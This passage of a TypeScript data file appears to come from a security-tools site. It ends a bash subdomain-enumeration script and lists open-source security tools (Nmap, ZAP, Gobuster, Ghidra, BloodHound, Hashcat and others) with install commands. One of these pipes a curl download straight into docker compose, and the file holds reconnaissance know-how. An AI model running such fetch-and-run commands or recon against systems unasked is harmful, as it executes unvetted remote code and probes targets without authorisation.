    jq -r '.[].name_value' 2>/dev/null | \\
    sed 's/\\*\\.//g' | \\
    sort -u)

COUNT=$(echo "\${SUBDOMAINS}" | grep -c "\${TARGET}")

echo "[+] Discovered \${COUNT} unique subdomains for \${TARGET}:"
echo "--------------------------------------------------------"

for sub in \${SUBDOMAINS}; do
    # Perform rapid host lookup
    IP=$(getent hosts "\${sub}" | awk '{print $1}' | head -n1)
    if [ -n "\${IP}" ]; then
        echo "  [LIVE] \${sub} -> \${IP}"
    else
        echo "  [DNS]  \${sub}"
    fi
done

echo "--------------------------------------------------------"
echo "[+] Enumeration completed."
`
  }
];

export const OPEN_SOURCE_TOOLS: OpenSourceTool[] = [
  {
    id: 'tool-nmap',
    name: 'Nmap (Network Mapper)',
    tagline: 'Port Scanning, Host Discovery & Vulnerability Auditing',
    category: 'Network Recon',
    description: 'The industry-standard open-source network discovery and vulnerability scanner. Supports high-speed raw TCP/UDP port scans, OS fingerprinting, and automated Lua scripting via the Nmap Scripting Engine (NSE).',
    license: 'NPSL / Open Source',
    officialUrl: 'https://nmap.org',
    githubUrl: 'https://github.com/nmap/nmap',
    installCommand: 'sudo apt update && sudo apt install -y nmap',
    tags: ['Recon', 'Port Scan', 'NSE', 'CLI', 'Defense & Offense']
  },
  {
    id: 'tool-zap',
    name: 'OWASP ZAP (Zed Attack Proxy)',
    tagline: 'Automated Web Vulnerability Scanner & Interception Proxy',
    category: 'Web Exploitation',
    description: 'The world\'s most popular free, open-source web application security scanner. Ideal for capturing HTTP/HTTPS traffic, active & passive vulnerability scanning, automated AJAX spiders, and modern REST/GraphQL API testing.',
    license: 'Apache-2.0',
    officialUrl: 'https://www.zaproxy.org',
    githubUrl: 'https://github.com/zaproxy/zaproxy',
    installCommand: 'docker run -u zap -p 8080:8080 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh',
    tags: ['OWASP', 'Web Sec', 'Proxy', 'API Testing', 'GUI & CLI']
  },
  {
    id: 'tool-gobuster',
    name: 'Gobuster',
    tagline: 'High-Speed Web Directory, DNS & VHost Brute-Forcer',
    category: 'Web Exploitation',
    description: 'Fast, multi-threaded Go utility engineered for high-performance brute-forcing of URIs, directories, DNS subdomains, virtual hosts, and Amazon S3 cloud buckets.',
    license: 'Apache-2.0',
    officialUrl: 'https://github.com/OJ/gobuster',
    githubUrl: 'https://github.com/OJ/gobuster',
    installCommand: 'go install github.com/OJ/gobuster/v3@latest',
    tags: ['Go', 'Fuzzing', 'Directory Brute', 'DNS', 'CLI']
  },
  {
    id: 'tool-ghidra',
    name: 'Ghidra (NSA Software Reverse Engineering)',
    tagline: 'Full-Spectrum Decompiler, Disassembler & Binary SRE',
    category: 'Reverse Engineering',
    description: 'A powerful software reverse engineering framework developed by the National Security Agency. Features an exceptional native C decompiler, multi-architecture disassembly (x86, x64, ARM, MIPS, PowerPC), scriptable headless analyzer, and collaborative CTF team reversing.',
    license: 'Apache-2.0',
    officialUrl: 'https://ghidra-sre.org',
    githubUrl: 'https://github.com/NationalSecurityAgency/ghidra',
    installCommand: 'wget https://github.com/NationalSecurityAgency/ghidra/releases/latest -O ghidra.zip && unzip ghidra.zip',
    tags: ['Decompiler', 'NSA', 'Disassembly', 'Binary SRE', 'CTF Pwn']
  },
  {
    id: 'tool-volatility',
    name: 'Volatility 3',
    tagline: 'Advanced Memory Artifact Forensics & Incident Response',
    category: 'Memory & DFIR',
    description: 'The world\'s premier open-source memory forensics framework for extracting digital artifacts from volatile RAM dumps. Decodes process trees, detects unbacked shellcode injection (malfind), reconstructs network sockets, and audits kernel rootkits across Windows, Linux, and macOS.',
    license: 'VSL v1.0',
    officialUrl: 'https://www.volatilityfoundation.org',
    githubUrl: 'https://github.com/volatilityfoundation/volatility3',
    installCommand: 'git clone https://github.com/volatilityfoundation/volatility3.git && cd volatility3 && pip3 install -r requirements.txt',
    tags: ['DFIR', 'Memory Forensics', 'RAM Dump', 'Malfind', 'Python']
  },
  {
    id: 'tool-bloodhound',
    name: 'BloodHound Community Edition (CE)',
    tagline: 'Active Directory & Azure/Entra ID Attack Path Mapping',
    category: 'Active Directory',
    description: 'Graph-theory based security analysis tool designed to reveal hidden, complex relationships and lateral movement attack paths within Active Directory and Azure/Entra ID environments. Essential for both red team pathfinding and blue team defensive hardening.',
    license: 'Apache-2.0 / FOSS',
    officialUrl: 'https://bloodhound.specterops.io',
    githubUrl: 'https://github.com/SpecterOps/BloodHound',
    installCommand: 'curl -L https://ghst.ly/get-bhce | docker compose -f - up',
    tags: ['Active Directory', 'Attack Paths', 'Graph Theory', 'PrivEsc', 'Docker']
  },
  {
    id: 'tool-wireshark',
    name: 'Wireshark & TShark',
    tagline: 'Deep Packet Inspection & Network Protocol Dissector',
    category: 'Packet Analysis',
    description: 'The world\'s foremost open-source network protocol analyzer. Captures live traffic, parses hundreds of protocols in microsecond resolution, and decrypts TLS/SSL streams with pre-master secret logs for threat hunting and CTF forensic challenges.',
    license: 'GPL-2.0',
    officialUrl: 'https://www.wireshark.org',
    githubUrl: 'https://gitlab.com/wireshark/wireshark',
    installCommand: 'sudo apt install -y wireshark tshark',
    tags: ['PCAP', 'Packets', 'Network DFIR', 'TLS Inspection', 'GUI & CLI']
  },
  {
    id: 'tool-hashcat',
    name: 'Hashcat',
    tagline: 'World\'s Fastest GPU-Accelerated Password Recovery Utility',
    category: 'Cracking & Crypto',
    description: 'The world\'s fastest and most advanced password recovery tool, supporting hundreds of hash formats (NTLM, SHA-256, Kerberos tickets, bcrypt, WPA/WPA2) with rule-based permutations and multi-GPU compute kernels.',
    license: 'MIT',
    officialUrl: 'https://hashcat.net/hashcat/',
    githubUrl: 'https://github.com/hashcat/hashcat',
    installCommand: 'sudo apt install -y hashcat',
    tags: ['GPU Cracking', 'Hashes', 'Password Recovery', 'Crypto', 'CLI']
  }
];

